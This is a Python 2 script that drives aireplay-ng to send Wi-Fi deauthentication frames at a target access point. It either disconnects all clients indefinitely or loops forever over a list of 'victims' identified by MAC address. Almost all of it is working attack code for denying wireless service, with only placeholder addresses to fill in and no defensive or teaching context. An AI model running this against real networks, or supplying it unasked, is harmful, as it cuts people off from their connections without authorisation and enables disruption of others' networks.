#! /usr/bin/env python
import subprocess
import signal
import sys

#Deauthenticate all clients (You should use aircrack-ng directly):
network = "00:00:00:00:00:00"
victims = []

#Deauthenticate these specific clients:
#network = "00:00:00:00:00:00"
#victims = [
#    "00:00:00:00:00:11", #Client 01
#    "00:00:00:00:00:22", #Client 02
#    "00:00:00:00:00:33", #Client 03
#    "00:00:00:00:00:44", #Client 04
#    "00:00:00:00:00:55"] #Client 05

interface = "wlan1mon"

def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit(0)

def deauth_all_clients(net):
    command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
    print "[+] Deauthenticating all clients in the network"
    print "[!] You may as well run aireplay-ng directly: [{0}]\n".format(command)
    subprocess.call([command], shell=True) #Runs forever

def deauth_client(net, cli):
    print "\n[+] Deauthenticating {0}\n".format(cli)
    command = "aireplay-ng --deauth 3 -a {0} -c {1} {2}".format(net, cli, interface)
    subprocess.call([command], shell=True)

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    print "[+] Target Network:\n\t{0}".format(network)

    if len(victims) == 0:
        deauth_all_clients(network) #Will only return if there's an error
        sys.exit(1)

    print "[+] Target Clients:"
    for i in range(0, len(victims)):
        print "\t{0}".format(victims[i])
    while True:
        for i in range(0, len(victims)):
            deauth_client(network, victims[i])
